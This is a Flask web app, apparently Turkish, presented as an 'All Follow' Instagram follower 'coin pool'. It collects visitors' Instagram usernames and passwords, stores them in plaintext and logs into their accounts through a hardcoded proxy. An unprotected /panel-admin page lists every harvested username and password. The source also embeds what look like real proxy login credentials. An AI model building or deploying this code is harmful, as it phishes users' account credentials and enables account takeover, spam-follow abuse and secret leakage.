import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///allfollow.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# PROXY - TR LOKASYON
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class PoolUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(50), default="Bekliyor")

# --- UI AYNI KALIYOR (MODERN ALL FOLLOW) ---
HTML_UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>All Follow | Coin Pool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body{background:#0f172a;}</style>
</head>
<body class="flex items-center justify-center min-h-screen text-slate-200">
    <div class="bg-slate-800/50 p-8 rounded-3xl w-full max-w-[400px] border border-slate-700">
        <h1 class="text-4xl font-black text-center text-white italic mb-8">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
            <button onclick="join()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold uppercase tracking-widest">Sisteme Bağlan</button>
            <p id="msg" class="text-center text-sm mt-4"></p>
        </div>
    </div>
    <script>
        async function join() {
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            btn.disabled = true; btn.innerText = "BAĞLANILIYOR...";
            const r = await fetch('/api/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u,p})});
            const d = await r.json();
            msg.innerText = d.msg;
            if(d.status === "success") { btn.innerText="BAĞLANDI ✅"; }
            else { btn.disabled = false; btn.innerText="TEKRAR DENE"; }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = PoolUser.query.filter_by(username=u).first()
    if not user:
        user = PoolUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    cl = Client()
    try:
        # Hızlandırmak için proxy ve zaman aşımını daraltıyoruz
        cl.set_proxy(PROXY_URL)
        cl.request_timeout = 20 
        
        # Giriş denemesi
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Havuza başarıyla katıldınız!")
        
    except BadPassword:
        user.status = "Hatalı Şifre ❌"
        db.session.commit()
        return jsonify(status="error", msg="Şifreniz yanlış, lütfen kontrol edin.")
    except ChallengeRequired:
        user.status = "Doğrulama İstiyor (Onayla) ⚠️"
        db.session.commit()
        return jsonify(status="error", msg="Instagram doğrulama istiyor, lütfen uygulamadan onaylayın.")
    except Exception as e:
        # Eğer hala "Meşgul" diyorsa hata burada yakalanır
        error_str = str(e).lower()
        if "feedback_required" in error_str:
            user.status = "IP Bloklandı (Bekle)"
            return jsonify(status="error", msg="Instagram şu an bu IP'yi engelledi. 1-2 dk sonra dene.")
        
        user.status = f"Hata: {str(e)[:15]}"
        db.session.commit()
        return jsonify(status="error", msg="Bağlantı hatası, tekrar deneyin.")

@app.route('/panel-admin')
def admin():
    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
    res = "<body style='background:#0f172a;color:#fff;padding:20px;font-family:sans-serif;'>"
    res += f"<h2>Hesap Havuzu ({len(users)})</h2><table border='1' style='width:100%'>"
    for u in users:
        res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
